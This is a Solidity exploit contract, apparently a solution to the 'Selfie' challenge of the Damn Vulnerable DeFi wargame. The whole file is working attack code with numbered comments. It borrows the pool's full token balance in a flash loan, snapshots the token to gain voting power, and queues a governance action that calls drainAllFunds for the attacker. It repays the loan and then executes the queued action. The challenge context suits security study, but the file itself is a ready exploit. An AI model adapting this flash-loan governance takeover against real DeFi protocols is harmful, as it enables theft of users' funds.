//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Snapshot.sol";
import "./SimpleGovernance.sol";

/**
 * @title DrainSelfiePool
 * @notice Drains DVT tokens from `SelfiePool` contract using an exploit in it's governance mechanism
 * @author Joshua Oladeji <analogdev.eth>
 */
contract DrainSelfiePool {
    ISelfiePool public lendingPool;
    uint256 public attackActionId;

    constructor(ISelfiePool _lendingPool) {
        lendingPool = _lendingPool;
    }

    function receiveTokens(address _token, uint256 _amount) external {
        require(
            msg.sender == address(lendingPool),
            "exclusive access to lending pool!"
        );

        // 2. take snapshot of token
        IDamnValuableTokenSnapshot(_token).snapshot();

        // 3. propose an action to transfer all funds to attacker contract
        attackActionId = lendingPool.governance().queueAction(
            address(lendingPool),
            abi.encodeWithSignature("drainAllFunds(address)", tx.origin),
            0
        );
        ERC20Snapshot(_token).transfer(address(lendingPool), _amount);
    }

    function attack() external {
        // 1. take a flashloan to attack contract
        lendingPool.flashLoan(
            lendingPool.token().balanceOf(address(lendingPool))
        );
    }

    // 4. fast forward the timestamp on the evm
    function completeAttack() external {
        // 5. execute the propsed governance action
        lendingPool.governance().executeAction(attackActionId);
    }
}

interface ISelfiePool {
    function flashLoan(uint256 borrowAmount) external;

    function token() external view returns (ERC20Snapshot);

    function governance() external view returns (SimpleGovernance);
}

interface IDamnValuableTokenSnapshot {
    function snapshot() external returns (uint256);
}
